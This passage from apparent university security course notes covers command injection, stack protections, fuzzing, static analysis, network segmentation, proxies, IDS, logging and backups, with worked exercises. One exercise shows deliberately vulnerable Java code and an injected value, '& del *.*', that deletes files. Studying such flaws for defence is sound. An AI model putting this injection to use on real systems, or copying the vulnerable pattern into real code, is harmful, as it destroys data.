<div class="sourceCode" id="cb11"><pre
class="sourceCode java"><code class="sourceCode java"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">...</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> btype <span class="op">=</span> request<span class="op">.</span><span class="fu">getParameter</span><span class="op">(</span><span class="st">&quot;backuptype&quot;</span><span class="op">);</span></span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="bu">String</span> cmd <span class="op">=</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">(</span><span class="st">&quot;cmd.exe /K </span><span class="sc">\&quot;</span></span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>c<span class="op">:</span>\\util\\rmanDB<span class="op">.</span><span class="fu">bat</span>\<span class="st">&quot;</span></span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="op">+</span> btype <span class="op">+</span></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>\<span class="st">&quot;&amp;&amp; c:</span><span class="sc">\\</span><span class="st">util</span><span class="sc">\\</span><span class="st">cleanup.bat</span><span class="sc">\&quot;</span><span class="st">&quot;</span><span class="op">)</span></span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="bu">System</span><span class="op">.</span><span class="fu">Runtime</span><span class="op">.</span><span class="fu">getRuntime</span><span class="op">().</span><span class="fu">exec</span><span class="op">(</span>cmd<span class="op">);</span></span></code></pre></div>
<p>Name the type of attack that could happen here and explain its
possible consequences.</p>
<p>This code is vulnerable to command injections. By inserting the
correct characters into the backuptype and attacker can execute any
command on the server, for example deleting all the files. In our case
the program runs the Windows command interpreter cmd. CMD accepts
multiple commands if they are separated by &amp; or &amp;&amp;. Thus,
the following value for backuptype would delete all files in the current
directory: &amp; del *.* .</p>
<p><strong>Exercise 6.3</strong> Memory pages can be protected against
writing or execution. Explain why it is dangerous to have pages where
both execution and writing are permitted.</p>
<p>If a page is both writable and executable, an attacker could store
data that corresponds to instructions (a shellcode) and then manipulate
the instruction pointer to have this code executed.</p>
<p>Writable memory pages are used to store data received by the program.
Executable pages contain instructions of the program.</p>
<p>As there is often no need to modify the instructions of a program
that is executed, executable pages are set to read-only and writeable
pages to non-executable. This prevents the execution of shellcode,
without interfering with the correct execution of the program.</p>
<p><strong>Exercise 6.4</strong> At the end of a function call, two
addresses are often popped from the stack. What are those two addresses
used for ?</p>
<p>One address is the base pointer of the function to which we are
returning. The base pointer points the start of the memory region where
the local variables of a function are stored.</p>
<p>(As the current function is about to end, its local variables will
not be needed anymore. However, the function we are returning to will
need to access its local variables. This is why we restore the value of
the base pointer to the value we stored on the stack before we started
the function.)</p>
<p>The second address that is popped from the stack is the return
address which indicates at which address in the code the execution has
to continue after the end of the function.</p>
<p><strong>Exercise 6.5</strong> Local variables are on the top of the
stack and the return address at the bottom. How can a buffer overflow
overwrite the return address that is below the variable on the
stack?</p>
<p>The stack actually grows from the top of the memory to the bottom of
the memory. Thus, the address of the bottom of the stack is higher than
the addresses at the top of the stack. When we overflow a buffer, we
write to addresses that get higher and higher and thus reach the bottom
of the stack.</p>
<p><strong>Exercise 6.6</strong> Why must a stack canary have a random
value ?</p>
<p>The stack canary is used to detect if the saved base pointer and the
return address have been overwritten by an overflow. If an attacker
could know the value of the canary, they could overwrite it with the
same value and the overflow would not be detected.</p>
<p><strong>Exercise 6.7</strong> Imagine a program where the name and
the price of a product are stored in memory just above a variable
containing the shipping address of the product. Be entering an extra
long shipping address, the customers are able to modify the price of the
product and buy it for cheaper. For each of the following protection
methods, explain if it could prevent this attack: • address space layout
randomization (ASLR) • marking the memory page as non executable or non
writeable • using a stack canary</p>
<p>ASLR will place the memory page of the variables at a random
location. They will still be adjacent and it will not prevent the
attack.</p>
<p>The program will not work if the memory page is not writeable, The
attack does not write any code into the memory. Marking the page
non-executable will not prevent the attack.</p>
<p>Finally, if the shipping address does not overflow more than the
memory used for the price, it will not affect any canaries. Thus, non of
these methods can prevent the attack.</p>
<h2 id="automated-testing">Automated Testing</h2>
<h4 id="why-testing">Why testing</h4>
<p>Testing is the process of analuzing a program to find errors.</p>
<p>To completely make it automated we need formal specification, but
it’s impossible to define these things completely.</p>
<p>Error could be a violation of the underlying specification:
functional requirements, operational requirements, and security
requirements - we can try to have automated attacks or previous attacks
(but if they don’t succeed, we still don’t know if it is secure), so we
should try all possible input combinations (there are limitations such
as for all characters up to length of n)</p>
<h4 id="limitations-of-testing">Limitations of testing</h4>
<p>Testing can only show the presence of bugs, never their absence</p>
<p>Bugs are everythere: There are giant code bases (chromium, linux
kernel, gnome, etc.), millions of LoC =&gt; huge attack surface, milions
of vulnerable hosts -&gt; weaponizable Dependency inflation - recursive
dependancies, single point-of-failure (e.g. log4j), redundant code, even
bigger attack surface. System abstraction - developers unaware of
underlying assumptions, ChatGPT-generated code Integration hell - 2
“bug-free” systems can still interact in a faulty manner</p>
<h4 id="software-testing-and-verification">Software testing and
verification</h4>
<p>Manual testing: Code reviews Unit and regressions tests (JUnit,
libcheck) are incomplete but sound, only code with tests is tested but
any failed tests indicate an actual issue</p>
<p>Semi-automated testing: Annotation (pre and post conditions) and
proof enginers (F* lang) Type checking and dependent types (Coq, F*)
Code byg pattern search (CodeQL) are as complete as annotations and
sound (modulo mistakes)</p>
<p>Automated testing: Static analysis (Facebook Infer, compiler checks)
is incomplete and unsound due to lack of runtime information but remains
an indicator of possible issues Dynamic analysis (fuzzing, symbolic
execution) is incomplete but sound due to state explosion but any
reported issues are true bugs</p>
<h3 id="manual-testing">Manual testing</h3>
<h4 id="code-reviews">Code reviews</h4>
<p>Formalized process of someone else looking at your code. Finding
flaws and code smells.</p>
<p><em>Flaws</em> - any violationsof the specification or bug. <em>Code
smells</em> - not per-se an issue but could become one (target to
improve)</p>
<p>Goals - improve code quality, find flaws, learning/knowledge
transfer, foster ideas/alternate solutions, compliance to standards</p>
<p>Code reviews can never find all flaws, but offer different
thoroughness</p>
<p>Most bugs are in most recent code.</p>
<p>Types:</p>
<ul>
<li>Inspection - group of reviewers goes through all code line-by-line
to find flaws and to document any unexpected behavior. Does not scale
well, and requires a lot of resources.</li>
<li>Walk-through - go through the finite set of changes - during a
pull-request.</li>
<li>Audit - (external) group of reviewers spot-checks the code to find
dlaws, often searching for patterns to find flaws/violations (does not
look for specific flaws, but general quality of the code)</li>
</ul>
<h4 id="unit-and-regression-tests">Unit and regression tests</h4>
<p><strong>Unit</strong> - small and individual tests for a fragment of
code Developers should write these tests during the development
alongside the code itself. <em>Positive</em> tests - ensure correctly
processes input, <em>negative</em> tests - fails correctly.</p>
<p><strong>Regression</strong> - bug that was fixed some time ago, and
due to code changes a bug reemerges. Unit tests help detect them after
the changes.</p>
<h3 id="semi-automated-testing">Semi-automated testing</h3>
<h4 id="static-analysis">Static analysis</h4>
<p>Syntax highlighting, compile-time warnings - goal is to highlight
issues in code, give feedvack to developer. Should be fast (low
overhead, simple analysis), myst have low false positives (warning
fatigue - psychological constant where you start ignoring the question
and using a default answer).</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">clang</span> <span class="at">-Wall</span> <span class="at">-Wextra</span> <span class="at">-Wpedantic</span></span></code></pre></div>
<p><code>Wall</code> - enables basic set of warnings, mostly easy to
fix; <code>Wextra</code> - exteends Wall, being a little more detailed
(examples are empty function bodies, unused parameters or sign
mismatches); <code>Wpedantic</code> - warns about anything that goes
beyond strict C/C++, highlights areas of bad code style as well;
<code>Weverything</code> - turn on every single warning that exists -
creates noise</p>
<blockquote>
<p>Static analysis reasons about code instead of executing it. (Dynamic
is a little bit different - it keeps track of concrete values during
execution)</p>
</blockquote>
<p>Advantages:</p>
<ul>
<li>Full coverage (no need for complete tests cases)</li>
<li>Complete (test cases may miss edge cases)</li>
<li>Abstract interpretation (no need for a runtime environment)</li>
</ul>
<p>Disadvantages:</p>
<ul>
<li>Computation depends on data, resulting in undecidability</li>
<li>Over-approximation due to imprecision and aliasing leading to false
positives</li>
</ul>
<h4 id="anotations">Anotations</h4>
<p>Augment source code but are not part of the functional code
itself</p>
<p>Compilers may use annotations to test or check certain properties:
Types in python, argument usage in C/C++, pre/postconditions for
verfication</p>
<h4 id="codeql---static-analysis-framework-to-find-bugs">CodeQL - static
analysis framework to find bugs</h4>
<p>Pattern-based code analysis engine to automate security checks.
Target code is parsed and analyzed based on patterns in the query
language, starting from sources the patterns search for a path towards a
sink.</p>
<p>Discovered paths indicate security vulnerabilities.</p>
<p>Same as fofther static analyses, may result in false positives.</p>
<p>Quality of the reported bugs depends on the quality of the queries
(heuristics).</p>
<h4 id="the-8-laws-of-static-analysis">The 8 “Laws” of static
analysis</h4>
<ul>
<li>Can’t check code you don’t see: must fit into build system</li>
<li>Can’t check code you can’t parse: must parse “real” code</li>
<li>Not everything is implemented in C: must handle other languages</li>
<li>Not a bug: developers will not fix any report</li>
<li>Not all bugs matter: developers must prioritize</li>
<li>False positives matter: reduce developer burden</li>
<li>False negatives matter: reduce developer burden</li>
<li>Annotations are extremely costly: reduce developer burden</li>
</ul>
<h3 id="automated-testing-1">Automated testing</h3>
<h4 id="formal-verification---model-checkingsymbolic-execution">Formal
verification - model checking/symbolic execution</h4>
<p>Formal verification is the act of proving or disproving the
correctness of the code.</p>
<p>Model checking - translate code into state machine, model checker
analyzes state machine Symbolic execution - engine analyzes program by
exploring paths</p>
<h5 id="bounde-model-checking">(bounde) model checking</h5>
<p>Analyst translates the code and specification into a finite state
machine.</p>
<p>While this allows end-to-end verification it is highly labor
intesive. Bounded model checking slices the program and checks the
slices instead to scale a bit further. 6000 lines program took 20+ years
to verify.</p>
<p>A bug was found in Formally Verified OS, how? - fault in state
machine</p>
<h5 id="symbolic-execution">Symbolic execution</h5>
<p>SE is an abstract interpretation of code. Agnostic to concrete values
(values become formulas)</p>
<h4 id="fuzzing">Fuzzing</h4>
<p>Automatic and dynamic software testing technique Key concept -
fastest way to test a program is to run it</p>
<p>Running the program many times, keeping the best inputs and
retry.</p>
<p>Obstacles (that hinder by control-flow and data-flow
restrictions):</p>
<ul>
<li>magic byte matching for the parsing</li>
<li>checksums</li>
<li>compression/encryption - e.g. crypto</li>
<li>dependencies</li>
<li>indirection</li>
</ul>
<p>Overcoming these obstacles is the subject of many research
efforts.</p>
<p>A fuzzer should explore the program - a bug cannot be found if its
code is not executed</p>
<p>A fuzzer should trigger bugs - executing buggy code does not
necessarily mean a bug has been triggered</p>
<p>A fuzzer should identify faults - a triggered fault that goes
unidentified is wasted effort</p>
<p>A fuzzer should be fast - speed is key to a fuzzer’s efficiency,
higher throughput = more inputs tested = higher chance of triggering a
bug if it exists.</p>
<p>Fuzzing executes 1000s of trials per second.</p>
<h5 id="blackbox-fuzzing">Blackbox fuzzing</h5>
<p>create input, run program, see if it crashes</p>
<p>give the input to the developer to reproduce the bug.</p>
<p>This is not very clever, because the input is random and limited at
the depth level.</p>
<h5 id="greybox-fuzzing">Greybox fuzzing</h5>
<p>Guided mutation - assign a quality to each input.</p>
<p>Quality e.g. which part of the code has been covered? Covers more
distinct code areas.</p>
<p>This remains fast and it sacrifices only few CPU cycles for
performance benefits.</p>
<h5 id="input-generation">Input Generation</h5>
<p>Not all input are made equal Mutation-based generation</p>
<ul>
<li>no specification needed</li>
<li>inputs are seen as binary blobs</li>
<li>mutators transform input (bit flips, int ops, clone, delete)</li>
<li>fast portable and scalable</li>
</ul>
<p>Grammar-based generation:</p>
<ul>
<li>specification is needed for input structure (e.g. PNG files)</li>
<li>unputs are seen as parametric data</li>
<li>parameters are sampled, constraints are resolved to generate
grammatically-valid inputs</li>
<li>may be slow, application-specific</li>
</ul>
<h4 id="sanitization---fault-detection">Sanitization - fault
detection</h4>
<p>Makes bugs more explicit.</p>
<p>Ideal sanitizer - detect bugs as soon as they occur. First
approximation - CPU exceptions (segfault, timeouts, div by 0, int
overflows)</p>
<p>LLVM sanitizers by policy:</p>
<ul>
<li>spatial and temporal memory safety
<ul>
<li>address sanitizer</li>
<li>memory sanitizer (uninitialized variables)</li>
</ul></li>
<li>Language-specific behavior
<ul>
<li>undefined behavior sanitizer (arithmetic overflows, div by 0,
misaligned pointers, int sign mismatch)</li>
</ul></li>
<li>Concurrency and ownership
<ul>
<li>thread sanitizer (Data races)</li>
</ul></li>
</ul>
<p>LLVM sanitizer can be applied to source code, at compile time.</p>
<p>Operates as a priori instrumentation, but there are ones without that
- Valgrind memcheck, QASan (QEMU- ased ASan), RetroWrite – they all have
overhead.</p>
<p>We need model/abstraction/policy for expected behavior. How to model
logic or semantic bugs? need specification</p>
<h4 id="identifying-faults">Identifying faults</h4>
<p>Crashes are good indication but not all faults crash. Sanitizers
implement fault detection by enforcing bounds.</p>
<h3 id="comparison-of-analyses">Comparison of Analyses</h3>
<p><strong>Formal verification</strong>: 100s lines of code, finds all
bugs <strong>Bounded model checking</strong>: 1,000s lines of code,
finds most bugs (scales formal verification by constraining loop bounds)
<strong>Symbolic execution</strong>: 10,000s lines of code, finds all
bugs (but may run into state explosion) <strong>Concolic
execution</strong>: 50,000s lines of code, finds bugs close to provided
concrete execution (focuses on single path to limit state explosion)
<strong>Fuzzing</strong>: 1,000,000s lines of code, finds many bugs
<strong>Warnings/simple analyzers</strong>: 100,000,000s lines of code,
finds lots of interesting locations</p>
<h2 id="exercises-7">Exercises 7</h2>
<p><strong>Exercise 7.1</strong> What is coverage-guided fuzzing, and
how does it differ from black-box fuzzing?</p>
<p>Coverage-guided fuzzing is a form of greybox fuzzing where the
feedback metric is coverage profiles. The fuzzer implements a search
algorithm to maximize the objective function which is code coverage. The
fuzzer then leverages this feedback to select interesting inputs and
mutate them, in an attempt to create even more interesting inputs. This
differs from blackbox fuzzing in that the latter does not incorporate
any feedback into the fuzzing process; inputs are sampled randomly with
static probabilities that are not affected by the behavior of the
program.</p>
<p><strong>Exercise 7.2</strong> Given the following program, how likely
is it for a blackbox, greybox, or whitebox fuzzer to find the correct
value for <code>user_input</code>?</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> foo <span class="op">(</span> <span class="dt">uint32_t</span> user_input <span class="op">)</span> <span class="op">{</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>  <span class="op">/</span>∗<span class="op">...</span>∗<span class="op">/</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>user_input <span class="op">==</span> CONSTANT<span class="op">)</span> <span class="op">{</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span>∗<span class="op">...</span>∗<span class="op">/</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    crash<span class="op">();</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span>∗<span class="op">...</span>∗<span class="op">/</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">/</span>∗<span class="op">...</span>∗<span class="op">/</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>Assuming a blackbox fuzzer, the likelihood of randomly generating a
32-bit integer to match a specific value is 1 in 2 32. A more advanced
fuzzer that leverages feedback could observe that such a comparison is
made and then reinsert the constant into the input in the next
iteration, increasing the likelihood to 1 in 2. A whitebox fuzzer knows
of this condition beforehand (e.g. through symbolic execution) and can
generate a valid input in a single attempt.</p>
<p><strong>Exercise 7.3</strong> What is a sanitizer and why is it
helpful in fuzzing? Why can certain bugs only be detected when using
sanitizers?</p>
<p>A sanitizer is a fault detector and reporter. It implements a
security policy and enforces it by inserting runtime checks and raising
a red flag when the policy is violated. They increase the likelihood
that a bug is detected, which is a requirement for successful fuzzing. A
fuzzer can only report/save a bug-triggering input if it is informed of
the fault that happened, and sanitizers are a great way to do that. The
most basic form of fault detection is through crashes: a bug corrupts
memory and results in an invalid memory access, which the CPU detects
and raises an exception for. However, not all memory corruptions crash,
and not all bugs corrupt memory, so many of them remain undetected,
unless a sanitizer which implements a policy that detects them is
employed.</p>
<h2 id="network-security">Network security</h2>
<h3 id="best-practices">Best practices</h3>
<p><strong>Inside</strong> the network: segment the network physically:
Different zone for different parts of the organization Demilitarized
Zone (DMZ)* to expose organization’s external facing networks to the
Internet - server that belongs to the organization but serve towards the
outside.</p>
<p>Towards the <strong>outside</strong> the network: secure
communication - TLS, IPSec, VPNs</p>
<h3 id="network-segmentation">Network segmentation</h3>
<p>Break the network down into segments based on system and data
classification.</p>
<p>Access from zone to zone can be managed by ACLs (access control
lists) in routers or firewalls. Users belong to individual areas. May
want to have central authentification service</p>
<p>Mainly addresses two points:</p>
<ul>
<li>prevents all-at-once compromise of facilities</li>
<li>protects the data center from external threats</li>
</ul>
<h4 id="rings">Rings</h4>
<p>Concentric architecture where the most privileged services are
inside, and therefore if you can access the center you access everything
around it.</p>
<h4 id="zones">Zones</h4>
<p>Creating containment zones aims to stops attacks from spreading
between zones. Communication between zones goes through backbone which
is connected to zones by firewalls. Closer to least privilege than
rings. The challenge is to create firewall rules for each case - easy to
make mistakes.</p>
<h4 id="demilitarized-zone-dmz">Demilitarized Zone (DMZ)</h4>
<p>Physical or logical subnetwork which contains and exposes the
organizations’s external-facing services And external network node can
access only what is exposed in the DMZ The most common services is
email, VPN endpoint</p>
<p>Two common architectures:</p>
<ul>
<li>firewall redirects teither to corporate network or DMZ</li>
<li>firewall -&gt; DMZ -&gt; internal firewall</li>
</ul>
<p>Firewall - has routing rules and decided the packet route based on
different kinds of information. Can be statefull or stateless</p>
<h4 id="virtual-segmentation">Virtual segmentation</h4>
<p><em>VLANs</em> - technologoy implements additional security services
at layer 2 network (ethernet). Makes the virtual cables and switches
that are accessible by specific accesses, even though the network goes
through the the same cables and switches.</p>
<p><em>Virtual Routing and Forwarding</em> - allows a single router to
be part of several IP networks with VLAN and VRF, any socket in any
location can be configured to belong to any ethernet network and IP
network.</p>
<p><em>Virtual Machines</em> - allows coalescing several servers and
routers on a single hardware rack. The web server in the DMZ may
actually be running on the same physical machine as the database of the
internal back-end zone.</p>
<p>It would be implemented at switches and routers level.</p>
<h4 id="zero-trust-networks">“Zero trust” networks</h4>
<p>Idea - do not trust anybody, not even internal machines. Prevent
lateral movement</p>
<p>Assume that any device can be compromised. So need to continuously
monitor and validate everything. Install local firewall on internal
machines (LPOP, access control) Encrypt all traffic between internal
machines Use strong authentication even internally (MFA)</p>
<p>More work to configure machines but with modern techniques (dockers,
kubernetes) configuring and rolling out virtual machines can be
automated. Less work on configuring the network Greatly reduces the
impact if one machine is compromised.</p>
<h3 id="protecting-remote-access---virtual-private-networks">Protecting
remote access - Virtual Private Networks</h3>
<h4 id="vpn">VPN</h4>
<p>VPN runs a private network over a public network using two
components:</p>
<ul>
<li>encryption to keep it private and for confidentiality (cannot hide
the metadata)</li>
<li>encapsulation packing IP packets inside IP packets to hide internal
addresses and to transport private packets over the public network</li>
</ul>
<p>A distant network or single machines can access a VPN thorugh a VPN
gateway A single machine can run a VPN software to create a virtual
interface, where it looks like the data coming from the network card is
being tunneled through the internet Before being sent, packet is
encrypted and encapsulated with IP header with the public addresses.</p>
<p><strong>Typical protocols</strong></p>
<ul>
<li>IPsec, official IETF standard</li>
<li>OpenVPN, open source software, based on TLS</li>
<li>WireGuard, built into the Linux kernel</li>
<li>Proprietary protocols (e.g., Cisco AnyConnect, Microsoft SSTP) offer
convenience in configuration and maintenance</li>
</ul>
<p><strong>Typical use</strong></p>
<ul>
<li>Letting remote workers access the internal company network</li>
<li>Interconnecting remote sites of a company</li>
<li>For us: Accessing university resources (e.g., to download
papers)</li>
<li>For us: Playing CTF and bridging networks between teams</li>
</ul>
<p><strong>VPN for privacy</strong> - VPN to another country and access
Internet from there The address is hidden by the one of the VPN
gateway.</p>
<p>Danger - the VPN provider sees your traffic</p>
<h3 id="protecting-the-perimeter">Protecting the perimeter</h3>
<h4 id="firewalls">Firewalls</h4>
<p>Firewall enforce network level access control and limit what kind of
data is being passed through.</p>
<p>Typically border between Internet and internal network.</p>
<p>Firewalls operate at the netowrk layer by analyzing metadata such as
apacket headers of IP, TCP, UDP. Are oblivious of the application for
which the packets are transmitted.</p>
<p>Within the network: idea is to segement the network to limit lateral
movement of attackers.</p>
<p>EPFL example: most machines are in the generic EPFL zone All
muachines accessible from Internet are in untrust zone Machine in
uncrust cannot connect to machines in EPFL, but opposite is OK Secret
data in in Data Center zone, behind a firewall. Zones can connect to
other zones of lesser security, like MAC.</p>
<p><strong>Best practices</strong> - allowlist</p>
<p>Explicitly allow certain connections and deny the rest.</p>
<p>Examples - allow only HTTP and HTTPS from internal zone to Internet,
allow SSH from Internet only to one server.</p>
<p>Principle of <strong>default deny</strong> - the last rule denies all
traffic that has not explicitly been allowed before.</p>
<p>Default allow is a problem because something will be missed.</p>
<blockquote>
<p>Exclusively work at metadata level</p>
</blockquote>
<h4 id="proxies">Proxies</h4>
<p><strong>Operates at the application level</strong></p>
<p>Proxy acts as a server to the client and a client to the server -
like a MITM</p>
<p>Proxy: client - proxy - internet - server Reverse proxy: client -
internet - reverse proxy - server</p>
<p>Direct proxies protect users when they access servers on the Internet
Reverse proxies protect servers when accessed by users from the
Internet</p>
<h5 id="web-proxies">Web proxies</h5>
<p>Goal - protect users surfing the web against threats by reducing
attack surface</p>
<p>Analuze all data downloaded from the web Block access to dangerous
sites</p>
<p>The browser must be configured to use the proxy The firewall can be
configured to only allow the proxy access web sites, users cannot surf
the net if they don’t go throug the proxy.</p>
<p>Problem: Proxy needs access to the cleartext, which means they cannot
work by default for TLS. Solution - the proxy can be configured to
intercept HTTPS traffic. Rather than forwarding the handshake it
pretends to be the server. (generates fake certificates like company
ones - therefore all browsers would need to be configured to accept that
cert) Solution - passthrough but then proxy does not see the data</p>
<h5 id="mail-gateways">Mail gateways</h5>
<p>Mail gateways act both as proxy and reverse proxy: all outgoing mail
is stored on the mail gateway before being forwarded to the internet</p>
<p>All incoming mail is intercepted by the gateway before being
forwarded to the users’ mailbox</p>
<p>Mail gateways typically offer antivirus protection, incoming and
outgoing spam protection</p>
<h5 id="web-application-firewall-waf">Web Application Firewall
(WAF)</h5>
<p>WAF is a typicall example of a reverse proxy with the goal of
protectin a web server against maliciour requests It analyses requests,
and if it deems safe, forwards them to the real server</p>
<p>WAFs typically offer:</p>
<ul>
<li>block any request that seems to contain an attack (XSS, SQL
injection)</li>
<li>limit the number of requests to protect against DoS attacks</li>
<li>block an IP address for certain time after attack detected</li>
<li>authenticate users (CAPTCHA)</li>
</ul>
<p>Example - modSecurity Checks for XSS, or SQL injections.</p>
<p>Analyzes the HTTP traffic</p>
<h5 id="intrusion-detection-systems">Intrusion detection systems</h5>
<p>IDS inspects traffic for all applications to detect potential
intrustions Generates alerts if it thinks it saw an attack and then
terminates the connection</p>
<p>Two technologies: Signature-based systems - false positives
Anomaly-based systems - false negatives</p>
<p><strong>Signature-based IDS</strong>: compares network traffic
against signatures from a pattern database</p>
<p>Issues:</p>
<ul>
<li>requires previous knowledge of an attack to create a signature
(false negatives for new attacks)</li>
<li>matched signature does not always mean successful attack (E.g.
signature for linux vulnerability in traffic of a windows server - false
positives)</li>
</ul>
<p>Signature examples:</p>
<ul>
<li>High number of failed login attempts</li>
<li>URLs with extra long parameters (buffer overflow?)</li>
<li>Exploiting a specific vulnerability: Cisco IOS invalid IKE fragment
length memory corruption or exhaustion attempt</li>
</ul>
<p>Example - Sort - sniffs traffic in front of your firewall to detect
potential attacks. Sends alarms and/or updates to frewall, blocking the
attacker. Large db of free rules maintained by community.</p>
<p><strong>Anomaly-based IDS</strong> Goal - detect unknown attacks</p>
<p>IDS creates a traffic profile during normal operation to
calibrate.</p>
<p>During monitoring, it looks for unusual packes, e.g. growth in port
scans</p>
<ul>
<li>might not detect an SQL injection (extra characters in
username)</li>
<li>might notice a 200MB transwer of password hases from the db</li>
</ul>
<p>Generates a lot of false positives and negatives (anomaly != attack)
(very hot application for machine learning)</p>
<p>Pr(MarkedAsMalware|IsMalware) = TPR = 0.99 Pr(IsMalware) = 0.0001
Pr(MarkedAsMalware) = 0.01 Pr(IsMalware|MarkedAsMalware) =
Pr(MarkedAsMalware|IsMalware)*Pr(IsMalware)/Pr(MarkedAsMalware) =
0.99*0.0001/0.01 = 0.0099</p>
<h3 id="protecting-the-workstation">Protecting the workstation</h3>
<p>Prevent exploitable bugs: ensure automatic update of the OS, ensure
automatic update of the applications</p>
<p>Prevent known malware: install antivirus or use built-in ones,
install applications from trusted sources</p>
<p>Antivirus usefullness has gone down - malware campaing used to be
live 2-3 weeks, and now it is 2-3 hours because they assume they will be
signatured and put to the database.</p>
<p>Prevent unknown malware: prohibit users from installing applications,
restrict write access to dirs that contain documents, not programs</p>
<h4 id="preventing-the-privilege-escalation">Preventing the privilege
escalation</h4>
<p>Verify that all access rights are correctly set on programs and
libraries</p>
<p>Typical issue - a program that is run by System is writable by any
user, the attacker replaces the program by a malicious program and
reboots the machine</p>
<p>Make sure that all programs are regularly patched to fix any known
vulnerabilities Make sure that the hard disk is encrypted, if not,
attackers can boot from USB (or remove disk) and have full access rights
to all files.</p>
<h4 id="protecting-history---logging">Protecting History - logging</h4>
<p>keeping audit trails (logs) is an important part of network security
to:</p>
<ul>
<li>identify security incidents</li>
<li>monitor policy violations</li>
<li>non repudiation control</li>
</ul>
<p>Typical sources of logs:</p>
<ul>
<li>firewalls, proxies and IDS</li>
<li>client and Server machines</li>
<li>mail servers</li>
<li>database applications</li>
</ul>
<h5 id="things-you-should-never-log">Things you should never log</h5>
<ul>
<li><strong>passwords</strong></li>
<li>religious, ideological, political or trade union-related views or
activities</li>
<li>health, the intimate sphere or the racial origin</li>
<li>social security measures</li>
<li>administrative or criminal proceedings and sanctions</li>
</ul>
<p>Internet access logs should only be logged anonymously, nominal
analysis of Internet access is only allowed if there are tangible signs
of abuse</p>
<p>Mailboxes and logs should be protected against unauthorized
access.</p>
<h4 id="protecting-history---backups">Protecting History - backups</h4>
<p>3-2-1 rule:</p>
<ul>
<li>3 copies of the data</li>
<li>on 2 different types of media</li>
<li>1 stored off-site</li>
</ul>
<p><strong>Backup types</strong> - full, incremental (data that changed
since last backup), differential (data that changes since last full
backup)</p>
<p><strong>Backup content</strong>: different depending on the ype of
data:</p>
<ul>
<li>backup of (virtual) machines: allow to restore a machine without
having to re-install and configure all the software</li>
<li>backup of db: databases have their own tools to backup and restore
the content of their tables</li>
<li>file storage: data storage servers can archive every version of
every file up to the last backup (e.g. one day) so that no data is lost
if files are accidentally deleted during the day</li>
</ul>
<p><strong>Disasted recovery plan</strong>: making backups is not
sufficient Backups also need to be tested regularly through
<em>restoration tests</em>, i.e., to ensure we can recover data from
backups</p>
<p>A Disaster Recovery Plan (DRP) records, in detail, how to rebuild a
system in case of a major failure.</p>
<h2 id="exercises-8">Exercises 8</h2>
<p><strong>Exercise 8.1</strong> Consider the following two options for
letting remote users access your company’s e-mail: • They use a VPN
access to the company’s network. Then, they can use their preferred mail
client to access the mail server of the company. • You install a web
server with a web-mail program (like ewa.epfl.ch) such that the users
can access their e-mail with any web browser. Which of the two options
is more secure? Why?</p>
<p>Typically, a VPN connection gives access to all of the internal
network for any type of traffic. Thus, if the user’s machine was
infected by a malware or under control of a hacker, the attack could
propagate to all of the internal network. The web-mail program only
gives access to e-mail. In case of an attack, only the e-mail would be
compromised. This is a typical application of the principle of least
privilege.</p>
<p><strong>Exercise 8.2</strong> Which option is safer: • Specifying
what is forbidden (black list) and allowing the rest. • Specifying what
is allowed (white list) and denying the rest. Explain why.</p>
<p>Using a white list is safer. Indeed, if you forget to put something
on the list you do not create a security risk. This is called the
principle of default deny.</p>
<p><strong>Exercise 8.3</strong> • Describe the difference between a
(direct) proxy and a reverse proxy. • Describe one security related
function that each proxy can provide.</p>
<p>A direct proxy is located close to the client. It receives all the
connections of the client for a given application (e.g. HTTP) and
forwards them to the corresponding server on the internet.</p>
<p>A reverse proxy is located close to the server. It receives the
connections of all clients and forwards them to a server.</p>
<p>A direct proxy can be used to block access to known dangerous
websites (e.g. phishing campaigns). It can also scan for malware in the
documents downloaded from the Internet.</p>
<p>A reverse proxy can detect and block web based attacks against a web
server (e.g. SQL injections).</p>
<p><strong>Exercise 8.4</strong> The web proxy of your company keeps a
log of all connections that are made to all websites. • Describe a
situation where these logs can be used to help secure the company’s
network. • Describe a situation where these logs could be a problem for
the company’s security.</p>
<p>If one workstation of the company was infected by a malware
downloaded from the Internet, the logs could help the company find out
which other workstations also downloaded the same malware.</p>
<p>If the logs contain passwords or access tokens used to access
protected information, an attacker who gains access to the logs would be
able to access the protected information. The company could be breaking
the law if the logs contain sensitive personal information that can be
linked to employees (e.g. which employee accessed which political
website). Such logs should only exist if there is a valid reason and
they should be protected in order to prevent abuse.</p>
<p><strong>Exercise 6.5</strong> • Describe the DRP plan that will make
possible to start over after your data center has burned down</p>
<p>A typical DRP could contain the following steps:</p>
<ul>
<li>Buy new machines.</li>
